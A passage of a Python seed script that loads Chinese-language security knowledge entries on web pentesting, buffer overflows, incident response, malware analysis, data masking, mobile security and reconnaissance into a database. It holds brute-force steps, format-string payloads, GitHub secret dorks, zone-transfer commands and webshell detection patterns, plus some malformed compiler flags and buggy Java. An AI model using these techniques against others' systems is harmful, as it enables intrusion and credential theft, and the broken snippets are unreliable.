| XSStrike | XSS检测 |

### Burp Suite使用

```bash
# 拦截请求
Proxy -> Intercept -> 开启拦截

# 重放请求
右键 -> Send to Repeater

# 暴力破解
Intruder -> Positions -> Add §
Intruder -> Payloads -> 加载字典
Intruder -> Start attack
```

## 漏洞防御检查清单

### SQL注入防御
- [ ] 使用参数化查询
- [ ] 输入验证
- [ ] 最小权限原则
- [ ] 错误信息隐藏

### XSS防御
- [ ] 输出编码
- [ ] Content-Security-Policy
- [ ] HttpOnly Cookie
- [ ] X-XSS-Protection头

### CSRF防御
- [ ] CSRF Token
- [ ] SameSite Cookie
- [ ] 验证Referer

### 文件上传防御
- [ ] 白名单扩展名
- [ ] MIME类型验证
- [ ] 文件内容检查
- [ ] 上传目录无执行权限
- [ ] 文件重命名""",
                "difficulty": "hard",
                "source": "Web渗透测试",
                "tags": ["渗透测试", "漏洞利用", "OWASP"]
            },
            {
                "title": "缓冲区溢出漏洞",
                "summary": "缓冲区溢出原理、利用与防护",
                "content": """# 缓冲区溢出漏洞

## 原理

缓冲区溢出是指程序向缓冲区写入的数据超过了其容量，导致相邻内存被覆盖。

```
栈布局（调用函数时）：
+------------------+ 高地址
| 返回地址         |
+------------------+
| 保存的EBP        |
+------------------+
| 本地变量         |
+------------------+
| 参数             |
+------------------+ 低地址

溢出时覆盖返回地址 → 执行恶意代码
```

## 漏洞示例

```c
// 漏洞代码
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 没有边界检查
}

// 攻击构造
// 输入长度超过64字节 → 覆盖返回地址
// 继续填充 → 跳转到shellcode地址
```

## 利用技术

### 1. 栈溢出（Stack Overflow）
覆盖返回地址，控制程序执行流。

### 2. 堆溢出（Heap Overflow）
堆管理结构损坏，控制malloc/free。

### 3. 格式化字符串
```c
// 漏洞
printf(user_input);

// 攻击
%s%s%s%s     // 泄露栈内容
%n            // 写入任意地址
```

### 4. 整数溢出
```c
int size = count * 4;
char *buf = malloc(size);  // size过大导致分配失败
```

## 防护措施

### 1. 编译器保护

```bash
# 编译时启用保护
gcc -fstack-protector - Canary值
gcc -fstack-protector-strong
gcc -D_FORTIFY_SOURCE=2    // 运行时检查
gcc -PIE -fpie             // 地址空间随机化
gcc -relro                 // 重定位只读
```

### 2. ASLR（地址空间随机化）
```bash
# 开启ASLR
echo 2 > /proc/sys/kernel/randomize_va_space
```

### 3. NX/DEP（数据执行保护）
硬件层面禁止栈/堆执行代码。

### 4. 安全函数
```c
// 不安全
strcpy(dst, src);
gets(buf);
sprintf(buf, fmt, ...);

// 安全替代
strncpy(dst, src, size);
fgets(buf, size, stdin);
snprintf(buf, size, fmt, ...);
```

### 5. 堆保护
- Safe Unlink
- Double Free检测
- 元数据保护

## 漏洞挖掘

### Fuzzing（模糊测试）
```python
# 示例：使用AFL对程序fuzz
afl-fuzz -i input_dir -o output_dir ./target_program @@
```

### 代码审计
- 检查所有strcpy/gets/sprintf等危险函数
- 追踪用户输入的数据流
- 分析边界条件

### 符号执行
```bash
# 使用angr进行符号执行
python angr_binary.py
```""",
                "difficulty": "hard",
                "source": "二进制漏洞",
                "tags": ["缓冲区溢出", "漏洞挖掘", "PWN"]
            }
        ]
    },
    "应急响应": {
        "description": "安全事件响应与取证分析",
        "items": [
            {
                "title": "应急响应流程",
                "summary": "安全事件响应的标准流程和方法",
                "content": """# 应急响应流程

## PDCERF模型

1. **准备阶段（Preparation）**
2. **检测阶段（Detection & Analysis）**
3. **遏制阶段（Containment）**
4. **根除阶段（Eradication）**
5. **恢复阶段（Recovery）**
6. **事后阶段（Follow-up）**

## 1. 准备阶段

### 建立响应团队
- 应急响应负责人
- 技术分析人员
- 法务/公关人员
- 管理层

### 准备工具
```bash
# 取证工具
dd                     # 磁盘镜像
foremost               # 文件恢复
strings                # 字符串提取
grep/sed/awk           # 日志分析
volatility             # 内存分析
autopsy                # 取证平台
```

### 建立文档
- 响应预案
- 联系方式列表
- 系统架构图
- 资产清单

## 2. 检测与分析

### 确定事件类型
- **恶意代码**：病毒、蠕虫、木马
- **Web攻击**：SQL注入、XSS、webshell
- **网络攻击**：DDoS、中间人
- **数据泄露**：拖库、删库
- **权限滥用**：内部威胁

### 收集证据
```bash
# 系统日志
/var/log/auth.log      # SSH登录
/var/log/secure         # 安全日志
/var/log/apache2/       # Web日志
C:\\Windows\\System32\\winevt\\Logs  # Windows事件日志

# 网络连接
netstat -tunap          # Linux
netstat -ano            # Windows

# 进程信息
ps aux                  # Linux
tasklist /v             # Windows

# 内存dump
sudo dd if=/dev/mem of=/tmp/mem.img
```

### 快速分析命令

```bash
# Linux应急
lastlog                  # 最近登录
who /var/log/wtmp        # 登录历史
ps -ef --sort=-pcpu     # CPU使用
top                      # 进程监控
lsof                     # 文件/端口
cat /etc/passwd          # 用户账户
grep "Failed" /var/log/auth.log  # 失败登录

# Windows应急
net user                 # 用户列表
netstat -ano | findstr ESTABLISHED  # 活动连接
wmic process list brief # 进程
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"  # 自启动
```

## 3. 遏制阶段

### 临时遏制
- 断网隔离
- 关闭服务
- 阻止攻击IP
- 禁用账户

### 永久遏制
- 关闭漏洞入口
- 更新防火墙规则
- 修补系统

## 4. 根除阶段

- 清除恶意文件
- 删除后门账户
- 修复配置
- 重建系统（严重时）

```bash
# 查找webshell
find /var/www -name "*.php" -mtime -1
grep -r "eval\|base64_decode\|system\|exec" /var/www/

# 查找可疑进程
ps aux | grep -E "\\.sh|\\.py|nc|mkfifo"
```

## 5. 恢复阶段

- 恢复数据
- 恢复服务
- 验证安全
- 持续监控

## 6. 事后分析

### 编写报告
- 事件时间线
- 攻击路径
- 损失评估
- 改进建议

### 改进措施
- 更新防御策略
- 加强监控
- 人员培训
- 完善预案""",
                "difficulty": "hard",
                "source": "应急响应指南",
                "tags": ["应急响应", "取证", "事件分析"]
            },
            {
                "title": "恶意软件分析基础",
                "summary": "恶意软件分析方法和工具",
                "content": """# 恶意软件分析基础

## 分析环境

### 沙箱环境
```bash
# 虚拟机隔离
VirtualBox / VMware

# Cuckoo沙箱
pip install cuckoo

# Any.Run在线分析
https://any.run/
```

### 必备工具
| 工具 | 用途 |
|------|------|
| IDA Pro | 反汇编 |
| Ghidra | 开源反汇编 |
| x64dbg | 动态调试 |
| OllyDbg | 32位调试 |
| Wireshark | 网络抓包 |
| Process Monitor | 进程监控 |
| FakeNet | 网络模拟 |

## 静态分析

### 1. 文件分析
```bash
# 查看文件类型
file malware.exe

# 查看哈希
md5sum malware.exe
sha256sum malware.exe

# 查看字符串
strings malware.exe
strings -n 10 malware.exe  # 10字符以上

# 查壳
peid malware.exe
exescan malware.exe
```

### 2. PE文件分析
```bash
# 查看导入表
dumpbin /IMPORTS malware.exe

# 查看导出表
dumpbin /EXPORTS malware.exe

# 查看资源
 ResourceHacker malware.exe
```

### 3. 恶意软件特征识别
- **YARA规则**
```yara
rule RansomwareNote {
    strings:
        $text1 = "Your files have been encrypted" nocase
        $text2 = ".encrypted" nocase
    condition:
        2 of them
}
```

## 动态分析

### 1. 行为监控
```powershell
# Process Monitor过滤
# 监控文件/注册表/进程操作

# Process Explorer
# 查看进程树、DLL、句柄
```

### 2. 网络监控
```bash
# Wireshark抓包
tcpdump -i eth0 -w capture.pcap

# 查看网络连接
netstat -ano > connections.txt
```

### 3. 注册表监控
```powershell
# 注册表对比
Regshot 2.0
```

### 4. 调试分析
```bash
# x64dbg调试
x64dbg.exe malware.exe

# 命令行调试
windbg.exe -z malware.exe
```

## 常见恶意软件类型

### 1. 勒索软件（Ransomware）
- 加密文件勒索
- 使用强加密（AES+RSA）
- 支付用比特币

### 2. 木马（Trojan）
- 伪装成正常软件
- 提供后门访问
- 键盘记录、屏幕截图

### 3. 蠕虫（Worm）
- 自我复制传播
- 不需要宿主程序
- 利用网络漏洞传播

### 4. 挖矿软件（Cryptominer）
- 占用CPU/GPU资源
- 连接矿池
- 持久化机制

## 分析检查清单

- [ ] 文件哈希和名称
- [ ] 导入的DLL和函数
- [ ] 字符串分析
- [ ] 网络行为
- [ ] 文件操作
- [ ] 注册表操作
- [ ] 进程行为
- [ ] 持久化机制""",
                "difficulty": "hard",
                "source": "恶意软件分析",
                "tags": ["恶意软件", "逆向分析", "沙箱"]
            }
        ]
    },
    "数据安全": {
        "description": "数据加密、脱敏与隐私保护",
        "items": [
            {
                "title": "数据加密与脱敏技术",
                "summary": "数据保护的各种加密和脱敏方法",
                "content": """# 数据加密与脱敏技术

## 数据加密

### 透明数据加密（TDE）
对整个数据库或文件进行加密。

```sql
-- MySQL TDE
ALTER TABLE sensitive_data ENCRYPTION='Y';

-- PostgreSQL TDE
配置 postgresql.conf
data_encryption = on
```

### 列级加密
```python
from cryptography.fernet import Fernet

# 生成密钥
key = Fernet.generate_key()
cipher = Fernet(key)

# 加密列数据
encrypted = cipher.encrypt(b"敏感数据")
decrypted = cipher.decrypt(encrypted)
```

### 应用层加密
在应用代码中实现加解密。

## 数据脱敏

### 静态脱敏

| 方法 | 示例 | 用途 |
|------|------|------|
| 掩码 | 1234****5678 | 展示 |
| 替换 | 真实值→假值 | 测试环境 |
| 打乱 | 随机排序 | 分析 |
| 截断 | 138****5678 | 手机号 |
| 泛化 | 30-40岁 | 年龄 |

### 动态脱敏
实时查询时根据用户权限动态脱敏。

```sql
-- PostgreSQL动态脱敏
CREATE MASK POLICY phone_mask
FOR (phone VARCHAR)
USING (
    CASE
        WHEN current_user = 'admin' THEN phone
        ELSE CONCAT(LEFT(phone, 3), '****', RIGHT(phone, 4))
    END
);
```

### 常用脱敏场景

#### 1. 手机号脱敏
```python
def mask_phone(phone):
    if len(phone) == 11:
        return phone[:3] + '****' + phone[-4:]
    return phone
```

#### 2. 身份证脱敏
```python
def mask_id_card(id_card):
    if len(id_card) >= 15:
        return id_card[:6] + '********' + id_card[-4:]
    return id_card
```

#### 3. 邮箱脱敏
```python
def mask_email(email):
    parts = email.split('@')
    if len(parts) == 2:
        name = parts[0]
        domain = parts[1]
        if len(name) > 2:
            return name[0] + '*' * (len(name)-2) + '@' + domain
    return email
```

## 数据库安全

### 访问控制
```sql
-- 最小权限原则
GRANT SELECT, INSERT ON app_db.users TO 'app_user'@'localhost';
REVOKE DELETE, DROP ON app_db.* FROM 'app_user'@'localhost';
```

### 审计日志
```sql
-- 启用查询审计
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/query.log';
```

## 隐私保护法规

### GDPR要点
- 个人数据定义
- 数据主体权利
- 数据处理合法性
- 数据泄露通知
- 隐私设计原则

### 国内法规
- 《个人信息保护法》
- 《数据安全法》
- 《网络安全法》""",
                "difficulty": "medium",
                "source": "数据安全",
                "tags": ["数据加密", "脱敏", "隐私保护"]
            }
        ]
    },
    # 分类8：移动安全 (0条)
    "移动安全": {
        "description": "移动应用安全与加固技术",
        "items": [
            {
                "title": "Android应用安全分析",
                "summary": "Android应用安全漏洞与防护措施",
                "content": """# Android应用安全分析

## 反编译防护

### 混淆技术
使用ProGuard或R8对代码进行混淆：
```
# build.gradle
android {
    buildTypes.release {
        minifyEnabled true
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
    }
}
```

### 反调试检测
```java
// 检测调试器
boolean isDebuggable = (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;

// 检测frida
public static boolean isFridaRunning() {
    String frida = "frida-server";
    File[] files = new File("/proc").listFiles();
    for (File file : files) {
        if (file.isDirectory()) {
            try {
                if (new FileInputStream(file.getAbsolutePath() + "/cmdline").read().toString().contains(frida)) {
                    return true;
                }
            } catch (Exception e) {}
        }
    }
    return false;
}
```

## 数据安全

### 安全存储
```java
// 使用EncryptedSharedPreferences
MasterKey masterKey = new MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build();

SharedPreferences sharedPreferences = EncryptedSharedPreferences.create(
    context,
    "secure_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
);
```

### 日志脱敏
```java
// 生产环境禁用Log
if (BuildConfig.DEBUG) {
    Log.d(TAG, "Sensitive data: " + sensitiveInfo);
}
```

## 组件安全

### Activity安全
```xml
<!-- AndroidManifest.xml -->
<activity android:exported="false">
```

### 权限最小化
```xml
<!-- 只申请必要的权限 -->
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
```""",
                "difficulty": "medium",
                "source": "移动安全",
                "tags": ["Android", "移动安全", "混淆"]
            },
            {
                "title": "iOS应用安全机制",
                "summary": "iOS应用安全特性与防护方法",
                "content": """# iOS应用安全机制

## 代码签名

iOS要求所有应用必须经过Apple签名才能安装：
1. 开发阶段：使用Development证书
2. 发布阶段：使用Distribution证书
3. App Store：Apple代为签名

## 安全特性

### Data Protection API
```swift
// 启用文件保护
let fileManager = FileManager.default
try fileManager.setAttributes(
    [.protectionKey: FileProtectionType.complete],
    ofItemAtPath: "sensitive_data.txt"
)
```

### Keychain安全
```swift
// 安全存储敏感数据
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "username",
    kSecValueData as String: "password".data(using: .utf8)!,
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
]
SecItemAdd(query as CFDictionary, nil)
```

### SSL Pinning
```swift
// 防止中间人攻击
class SSLPinningDelegate: NSObject, URLSessionDelegate {
    func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        // 验证服务器证书
    }
}
```

## 加固建议

1. 启用ATS（App Transport Security）
2. 使用TestFlight进行测试
3. 定期更新安全补丁
4. 代码混淆保护知识产权""",
                "difficulty": "medium",
                "source": "移动安全",
                "tags": ["iOS", "移动安全", "代码签名"]
            }
        ]
    },
    # 分类9：信息收集 (3条)
    "信息收集": {
        "description": "渗透测试前期的信息侦察技术",
        "items": [
            {
                "title": "网络空间搜索引擎利用",
                "summary": "使用Shodan、Censys等搜索引擎发现资产",
                "content": """# 网络空间搜索引擎利用

## Shodan

### 基本用法
```bash
# 搜索特定端口
shodan search port:22 country:cn

# 搜索特定设备
shodan search 'product:"Apache"'

# 搜索漏洞相关
shodan search vuln:cve-2021-44228
```

### API使用
```python
import shodan

api = shodan.API('YOUR_API_KEY')

# 搜索
results = api.search('apache')

# 获取主机信息
host = api.host('8.8.8.8')
```

## Censys

### 查询语法
```
443.https.get.headers.server: Apache
443.https.tls.certificates.leaf_data.subject.common_name: example.com
```

## FOFA（国内）

```bash
# 搜索Apache服务器
app="Apache"

# 搜索特定区域
region="China"
```

## 搜索技巧

1. **端口筛选**：port:22, port:80, port:443
2. **地理位置**：country:CN, city:Beijing
3. **服务类型**：product:"nginx"
4. **漏洞关联**：vuln:CVE-2021-xxxx""",
                "difficulty": "medium",
                "source": "渗透测试",
                "tags": ["Shodan", "信息收集", "侦察"]
            },
            {
                "title": "GitHub敏感信息泄露",
                "summary": "发现GitHub上泄露的敏感信息",
                "content": """# GitHub敏感信息泄露

## 常见泄露类型

1. **API密钥**
   - AWS keys: AKIA...
   - Google API keys: AIza...
   - Stripe keys: sk_live...

2. **凭据**
   - 数据库连接字符串
   - SMTP认证信息
   - SSH密钥

3. **配置文件**
   - .env文件
   - config.py
   - settings.xml

## 搜索工具

### GitHub Dorks
```bash
# GitHub搜索语法
filename:.env DB_PASSWORD
extension:.pem private
"aws_access_key" language:YAML
```

### truffleHog
```bash
# 检测git历史中的密钥
trufflehog https://github.com/user/repo
```

### gitGraber
```bash
# 实时监控GitHub
gitGraber -k wordlists/keywords.txt -q "company_name"
```

## 防护措施

1. **使用GitHub Secret Scanning**
2. **配置 .gitignore**
3. **员工安全培训**
4. **定期审计代码仓库""",
                "difficulty": "medium",
                "source": "安全运维",
                "tags": ["GitHub", "信息泄露", "密钥安全"]
            },
            {
                "title": "DNS信息收集技术",
                "summary": "DNS记录的查询与利用方法",
                "content": """# DNS信息收集技术

## DNS查询工具

### dig命令
```bash
# 基本查询
dig example.com

# 追踪查询路径
dig +trace example.com

# 查询特定记录
dig example.com MX
dig example.com TXT
dig example.com AXFR  # 区域传输
```

### dnsenum
```bash
# 全面DNS枚举
dnsenum example.com
```

## 子域名发现

### 被动收集
```bash
# 使用crt.sh
curl -s "https://crt.sh/?q=%.example.com" | grep -oP '(?<=<td>)[^<]+(?=</td>)' | sort -u

# amass
amass enum -passive -d example.com
```

### 主动扫描
```bash
# gobuster
gobuster dns -d example.com -w wordlist.txt

# ffuf
ffuf -w wordlist.txt -u https://FUZZ.example.com
```

## DNS区域传送

### 漏洞检测
```bash
# 检测是否允许区域传送
dig @ns1.example.com example.com AXFR
```

## DNS数据利用

1. **建立目标资产清单**
2. **发现隐藏服务**
3. **识别CDN和WAF**
4. **社工攻击面分析**""",
                "difficulty": "medium",
                "source": "渗透测试",
                "tags": ["DNS", "子域名", "信息收集"]
            }
        ]
    }
}


def import_knowledge():
    """导入网络安全知识数据"""
    app = create_app()

    with app.app_context():
        # 查找管理员账户作为作者
        admin = User.query.filter_by(role_id=1).first()
        if not admin:
            admin = User.query.first()
        if not admin:
            print("未找到用户，请先创建用户")
            return

        total_categories = 0
        total_items = 0

        for category_name, category_data in CATEGORIES_AND_ITEMS.items():
            # 创建或获取分类
            category = Category.query.filter_by(name=category_name).first()
            if not category:
                category = Category(
                    name=category_name,
                    description=category_data["description"],
                    sort_order=list(CATEGORIES_AND_ITEMS.keys()).index(category_name)
                )
                db.session.add(category)
                db.session.commit()
                print(f"创建分类: {category_name}")
            else:
                print(f"分类已存在: {category_name}")

            total_categories += 1

            # 添加知识条目
            for item_data in category_data["items"]:
                # 检查是否已存在
                existing = KnowledgeItem.query.filter_by(
                    title=item_data["title"],
                    category_id=category.id
                ).first()

                if existing:
                    # 更新已存在的条目
                    existing.summary = item_data["summary"]
                    existing.content = item_data["content"]
                    existing.difficulty = item_data.get("difficulty", "medium")
                    existing.source = item_data.get("source", "网络安全知识库")
                    existing.status = "published"
                    print(f"  更新: {item_data['title']}")
                    continue

                item = KnowledgeItem(
                    title=item_data["title"],
                    summary=item_data["summary"],
                    content=item_data["content"],
                    category_id=category.id,
                    difficulty=item_data.get("difficulty", "medium"),
                    source=item_data.get("source", "网络安全知识库"),
                    author_id=admin.id,
                    status="published"
                )
                db.session.add(item)
                db.session.commit()

                # 添加标签
                for tag_name in item_data.get("tags", []):
                    tag = KnowledgeTag(
                        knowledge_id=item.id,
                        tag_name=tag_name
                    )
                    db.session.add(tag)
                db.session.commit()

                print(f"  添加知识: {item_data['title']}")
                total_items += 1

        print(f"\\n导入完成！共创建 {total_categories} 个分类，{total_items} 个知识条目")


if __name__ == "__main__":
    print("开始导入网络安全知识数据...")
    print("=" * 50)
    import_knowledge()
